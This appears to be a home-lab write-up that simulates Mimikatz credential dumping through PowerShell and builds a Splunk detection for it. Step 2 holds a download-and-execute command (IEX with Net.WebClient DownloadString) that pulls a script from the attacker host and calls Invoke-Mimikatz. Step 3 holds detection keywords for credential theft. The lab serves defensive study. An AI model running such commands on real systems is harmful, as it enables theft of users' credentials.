# Scenario 5: Credential Dumping and Exfiltration (Mimikatz via PowerShell)

## 🎯 Objective

Simulate an advanced credential dumping attack using Mimikatz through obfuscated PowerShell commands, and detect it using Windows logging mechanisms and Splunk.

---

## 🧠 Threat Simulation: Why This Matters?

Credential dumping is a technique used by adversaries (like APTs) to extract password hashes or plaintext credentials from memory. Mimikatz is one of the most well-known tools for this.

In this scenario, we simulate an attacker executing Mimikatz via PowerShell and attempt to detect this behavior using advanced logging and SIEM.

---

## 🧪 Lab Environment

| Component     | Role             | IP Address        |
|---------------|------------------|-------------------|
| Kali Linux    | Attacker         | 192.168.1.14      |
| Windows 10    | Victim           | 192.168.1.15      |
| Ubuntu (ELK)  | SIEM (Splunk)    | 192.168.1.16      |

---

## 🛠️ Step-by-Step Execution

### ✅ Step 1: Enable PowerShell Logging on Windows

1. Open **PowerShell as Administrator** on the Windows 10 victim machine.
2. Enable PowerShell Script Block Logging and Module Logging:

```powershell
# Enable Script Block Logging
Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 1 -Force

# Enable Module Logging
Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging -Name EnableModuleLogging -Value 1 -Force
Reboot the system or restart PowerShell.
```
✅ Step 2: Simulate Mimikatz Attack via PowerShell
On the Windows machine, run:

powershell
```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.14/mimi.ps1')
Invoke-Mimikatz
```
Replace 192.168.1.14 with Kali IP where mimi.ps1 is hosted using python3 -m http.server 80.

✅ Step 3: Analyze Logs in Splunk
Search in Splunk for PowerShell logs:

splunk
```
index=winlogs EventCode=4104 OR EventCode=4103
Or specifically:
```
splunk
```
index=winlogs EventCode=4104 
| eval command=lower(Message)
| search command="mimikatz" OR command="sekurlsa::logonpasswords" OR command="frombase64string"
```

✅ Step 4: Create a Detection Alert
Save the above Splunk search as an Alert.

Name it: Credential Dumping via PowerShell

Trigger Condition: If results > 0

Notify via email or log to index.

🔍 Key Detection Points
Log Source	Event ID	Description
Sysmon	1, 10	Process creation, PowerShell
PowerShell Logs	4103, 4104	Module/script block logging
Security Event Logs	4688	New process creation
